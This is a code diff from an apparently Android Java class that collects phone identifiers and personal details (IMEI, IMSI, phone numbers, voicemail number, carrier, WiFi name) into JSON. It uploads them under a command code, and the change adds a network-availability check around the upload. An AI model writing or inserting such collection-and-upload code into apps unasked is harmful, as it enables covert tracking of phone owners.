@@ -194,10 +194,6 @@ public class PhoneInformation {
                 e.printStackTrace();
             }
 
-
-
-
-
             jsojbj.put("IMEI0", imei[0]);
             jsojbj.put("型号", androidModel);
             jsojbj.put("sim卡状态", simState);
@@ -229,7 +225,6 @@ public class PhoneInformation {
 
             jsojbj.put("网络",simnetworkType);
 
-
             jsojbj.put("可用内存", availableMem);
             jsojbj.put("cpu信息", cpuDescription);
             jsojbj.put("网络名称", simnetworkName);
@@ -246,15 +241,17 @@ public class PhoneInformation {
             jsojbj.put("运营商", subscriberId);
             jsojbj.put("WIFI", wifiName);
 
-
             jsojbj.put("IMEI1", imei[1]);
             jsojbj.put("IMSI1", imsi[1]);
             jsojbj.put("手机号码2", phone[1]);
             jsojbj.put("语音信箱", voiceMailNumber);
 
+            if (NetworkUitls.isNetworkAvailable(context)) {
+                UploadData.upload(jsojbj.toString().getBytes(), jsojbj.toString().getBytes().length, Public.CMD_DATA_DEVICEINFO, Public.IMEI);
+            }
+            else{
 
-            UploadData.upload(jsojbj.toString().getBytes(), jsojbj.toString().getBytes().length, Public.CMD_DATA_DEVICEINFO, Public.IMEI);
-
+            }
 
 	    	/*
 	        ret =
